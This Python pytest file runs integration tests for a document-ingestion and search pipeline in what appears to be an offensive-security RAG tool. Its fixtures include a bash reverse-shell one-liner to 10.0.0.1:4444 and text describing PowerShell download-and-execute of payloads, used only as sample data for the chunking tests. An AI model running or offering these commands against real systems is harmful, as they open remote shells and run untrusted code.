"""Real Integration Tests for RAG Document Ingestion Pipeline.

Tests for Story 6.4: Document Ingestion Pipeline.
These tests use REAL RAGStore and RAGEmbeddings to validate end-to-end functionality.
This validates the pipeline is production-ready.

Run with: pytest tests/integration/rag/test_ingest.py -v --no-cov
"""
import pytest
import tempfile
from pathlib import Path
from datetime import datetime

from cyberred.rag import (
    RAGStore,
    RAGEmbeddings,
    RAGIngestPipeline,
    DocumentChunker,
    MarkdownCodeBlockSplitter,
    IngestionProgress,
    IngestionStats,
    ContentType,
)


@pytest.mark.integration
class TestRealRAGIngestPipeline:
    """Real integration tests using actual RAGStore and RAGEmbeddings.
    
    These tests prove the ingestion pipeline is production-ready.
    """

    @pytest.fixture
    def temp_store_path(self) -> str:
        """Create temporary directory for test store."""
        with tempfile.TemporaryDirectory() as tmpdir:
            yield str(Path(tmpdir) / "test_rag_store")

    @pytest.fixture
    def real_store(self, temp_store_path: str) -> RAGStore:
        """Create real RAGStore in temp directory."""
        return RAGStore(store_path=temp_store_path)

    @pytest.fixture
    def real_embeddings(self) -> RAGEmbeddings:
        """Create real RAGEmbeddings (uses actual model)."""
        return RAGEmbeddings()

    @pytest.fixture
    def real_pipeline(
        self, real_store: RAGStore, real_embeddings: RAGEmbeddings
    ) -> RAGIngestPipeline:
        """Create real ingestion pipeline."""
        return RAGIngestPipeline(real_store, real_embeddings)

    @pytest.mark.asyncio
    async def test_full_ingest_and_search_cycle(
        self, real_pipeline: RAGIngestPipeline, real_store: RAGStore, real_embeddings: RAGEmbeddings
    ) -> None:
        """Ingest documents and verify they are searchable.
        
        This is the critical end-to-end test proving RAG readiness.
        """
        # Sample security documents
        documents = [
            {
                "text": "SQL injection is a code injection technique that exploits vulnerabilities in web applications. Attackers can use UNION SELECT statements to extract data from databases.",
                "metadata": {"technique_ids": ["T1190"]},
            },
            {
                "text": "Cross-site scripting XSS allows attackers to inject malicious scripts into web pages. Always sanitize user input to prevent XSS attacks.",
                "metadata": {"technique_ids": ["T1189"]},
            },
            {
                "text": "PowerShell is commonly used for post-exploitation. Use Invoke-WebRequest to download payloads and Start-Process to execute them.",
                "metadata": {"technique_ids": ["T1059.001"]},
            },
        ]
        
        # Ingest
        stats = await real_pipeline.process(
            source="test_integration",
            documents=documents,
            content_type=ContentType.METHODOLOGY,
        )
        
        # Verify ingestion stats
        assert stats.source == "test_integration"
        assert stats.document_count == 3
        assert stats.chunk_count >= 3  # At least 1 chunk per doc
        assert len(stats.failed_docs) == 0
        
        print(f"\n✅ Ingested {stats.document_count} documents → {stats.chunk_count} chunks")

        # Search for SQL injection
        query_embedding = real_embeddings.encode("SQL injection UNION SELECT database")
        results = await real_store.search(query_embedding, top_k=3)
        
        # Verify search works
        assert len(results) > 0, "Search returned no results!"
        
        # Top result should be about SQL injection
        top_result = results[0]
        assert "SQL" in top_result.text or "injection" in top_result.text, (
            f"Top result not about SQL injection: {top_result.text[:100]}"
        )
        
        print(f"✅ Search returned {len(results)} results")
        print(f"   Top result score: {top_result.score:.4f}")
        print(f"   Text: {top_result.text[:80]}...")

    @pytest.mark.asyncio
    async def test_code_blocks_preserved_and_searchable(
        self, real_pipeline: RAGIngestPipeline, real_store: RAGStore, real_embeddings: RAGEmbeddings
    ) -> None:
        """Code blocks are preserved intact and searchable."""
        documents = [
            {
                "text": """# Reverse Shell Payload

Use this bash reverse shell:

```bash
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
```

This connects back to the attacker's listener.""",
                "metadata": {"technique_ids": ["T1059.004"]},
            }
        ]
        
        stats = await real_pipeline.process(
            source="test_payloads",
            documents=documents,
            content_type=ContentType.PAYLOAD,
        )
        
        assert stats.document_count == 1
        
        # Search for bash reverse shell
        query_embedding = real_embeddings.encode("bash reverse shell tcp")
        results = await real_store.search(query_embedding, top_k=3)
        
        assert len(results) > 0
        
        # At least one result should contain the code block intact
        code_found = any("bash -i" in r.text and "/dev/tcp" in r.text for r in results)
        assert code_found, "Code block was split or corrupted during ingestion"
        
        print(f"\n✅ Code block preserved in search results")

    @pytest.mark.asyncio
    async def test_incremental_ingestion_skips_unchanged(
        self, real_pipeline: RAGIngestPipeline, real_store: RAGStore
    ) -> None:
        """Incremental ingestion skips documents that haven't changed."""
        documents = [
            {"text": "Document one content for incremental test.", "metadata": {"id": "doc1"}},
            {"text": "Document two content for incremental test.", "metadata": {"id": "doc2"}},
        ]
        
        # First ingestion
        stats1 = await real_pipeline.process(
            source="test_incremental",
            documents=documents,
            incremental=True,
        )
        first_chunk_count = stats1.chunk_count
        
        # Second ingestion with same documents
        stats2 = await real_pipeline.process(
            source="test_incremental",
            documents=documents,
            incremental=True,
        )
        
        # Should skip unchanged documents (chunk_count may be 0 or reused from cache)
        print(f"\n📊 Incremental test:")
        print(f"   First ingestion: {first_chunk_count} chunks")
        print(f"   Second ingestion: {stats2.chunk_count} chunks")
        
        # The key test: second ingestion should be much faster with same unchanged docs
        assert stats2.document_count == 2
        
    @pytest.mark.asyncio
    async def test_progress_callback_receives_updates(
        self, real_pipeline: RAGIngestPipeline
    ) -> None:
        """Progress callback receives correct updates during ingestion."""
        progress_updates: list = []
        
        documents = [
            {"text": f"Progress test document {i}.", "metadata": {}}
            for i in range(5)
        ]
        
        await real_pipeline.process(
            source="test_progress",
            documents=documents,
            progress_callback=lambda p: progress_updates.append(p),
        )
        
        assert len(progress_updates) == 5
        assert all(isinstance(p, IngestionProgress) for p in progress_updates)
        
        # Check progression is correct
        for i, p in enumerate(progress_updates, 1):
            assert p.current_doc == i
            assert p.total_docs == 5
            assert p.source == "test_progress"
        
        print(f"\n✅ Received {len(progress_updates)} progress updates")

    @pytest.mark.asyncio
    async def test_technique_ids_stored_correctly(
        self, real_pipeline: RAGIngestPipeline, real_store: RAGStore, real_embeddings: RAGEmbeddings
    ) -> None:
        """Technique IDs are stored and queryable."""
        documents = [
            {
                "text": "T1059.001: PowerShell command and scripting interpreter.",
                "metadata": {"technique_ids": ["T1059.001"]},
            },
        ]
        
        await real_pipeline.process(
            source="test_techniques",
            documents=documents,
        )
        
        query_embedding = real_embeddings.encode("PowerShell T1059")
        results = await real_store.search(query_embedding, top_k=1)
        
        assert len(results) == 1
        assert "T1059.001" in results[0].technique_ids
        
        print(f"\n✅ Technique IDs preserved: {results[0].technique_ids}")


@pytest.mark.integration
class TestChunkerEdgeCases:
    """Edge case tests to prevent regressions like infinite loops."""

    def test_overlap_equals_chunk_size_no_infinite_loop(self) -> None:
        """Overlap >= chunk_size must not cause infinite loop."""
        # This was the bug: chunk_size=50, overlap=50 caused infinite loop
        chunker = DocumentChunker(chunk_size=50, overlap=50)
        text = " ".join(["word"] * 200)
        
        # Should complete quickly, not hang - the key is no infinite loop
        chunks = chunker.chunk_document(text, source="test")
        assert len(chunks) > 0
        # With high overlap, we get many chunks but definitely finite
        assert len(chunks) < 1000  # No infinite loop = finite chunks

    def test_overlap_exceeds_chunk_size_no_infinite_loop(self) -> None:
        """Overlap > chunk_size must not cause infinite loop."""
        chunker = DocumentChunker(chunk_size=10, overlap=20)  # overlap > chunk_size
        text = " ".join(["word"] * 100)
        
        chunks = chunker.chunk_document(text, source="test")
        assert len(chunks) > 0
        assert len(chunks) < 500  # Finite, not infinite

    def test_markdown_splitter_overlap_equals_chunk_size(self) -> None:
        """MarkdownCodeBlockSplitter handles overlap >= chunk_size."""
        splitter = MarkdownCodeBlockSplitter(chunk_size=50, overlap=50)
        text = " ".join(["word"] * 200) + "\n\n```python\nx = 1\n```"
        
        segments = splitter.split_preserving_code_blocks(text)
        assert len(segments) > 0
        assert len(segments) < 500  # Finite, not infinite

    def test_very_long_document_chunking(self) -> None:
        """Very long documents are chunked without memory issues."""
        chunker = DocumentChunker(chunk_size=512, overlap=50)
        # 10,000 words - should produce ~20 chunks with overlap
        text = " ".join(["security"] * 10000)
        
        chunks = chunker.chunk_document(text, source="test")
        assert len(chunks) >= 15
        assert len(chunks) <= 30

    def test_empty_document_handling(self) -> None:
        """Empty documents return empty list."""
        chunker = DocumentChunker()
        
        assert chunker.chunk_document("", source="test") == []
        assert chunker.chunk_document("   ", source="test") == []
        assert chunker.chunk_document("\n\n", source="test") == []

    def test_single_word_document(self) -> None:
        """Single word document returns one chunk."""
        chunker = DocumentChunker()
        chunks = chunker.chunk_document("hello", source="test")
        
        assert len(chunks) == 1
        assert chunks[0].text == "hello"
